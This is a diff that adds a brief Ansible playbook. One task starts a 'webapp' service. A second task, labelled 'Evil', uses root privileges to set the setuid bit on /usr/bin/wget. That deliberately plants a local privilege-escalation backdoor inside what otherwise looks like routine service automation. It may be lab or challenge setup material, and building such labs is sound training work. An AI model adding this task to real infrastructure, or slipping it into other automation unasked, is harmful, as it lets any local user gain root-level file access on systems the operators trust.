@@ -1,0 +1,12 @@
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: yes
+      state: started
+  - name: Evil
+    ansible.builtin.shell: |
+      chmod +s /usr/bin/wget
+    become: true
+
